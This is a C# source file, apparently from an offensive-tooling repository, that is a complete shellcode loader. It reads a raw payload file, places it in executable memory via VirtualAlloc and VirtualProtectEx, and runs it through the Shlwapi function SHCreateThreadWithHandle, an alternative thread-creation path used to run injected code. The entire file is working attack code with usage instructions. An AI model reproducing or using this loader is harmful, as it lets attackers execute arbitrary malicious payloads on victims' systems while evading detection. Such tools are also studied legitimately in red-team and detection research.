// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SHCreateThreadWithHandle
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: SHCreateThreadWithHandle.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length,
                0x20/*RX*/, out oldProtect);

            IntPtr hThread = IntPtr.Zero;
            SHCreateThreadWithHandle(hAlloc, IntPtr.Zero, 0, IntPtr.Zero, ref hThread);

            uint INFINITE = 0xFFFFFFFF;
            WaitForSingleObject(hThread, INFINITE);

            //Cleanup
            CloseHandle(hThread);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Shlwapi.dll")]
        static extern bool SHCreateThreadWithHandle(
           IntPtr pfnThreadProc,
           IntPtr pData,
           uint flags,
           IntPtr pfnCallback,
           ref IntPtr hThread);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr Handle, uint Wait);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
    }
}
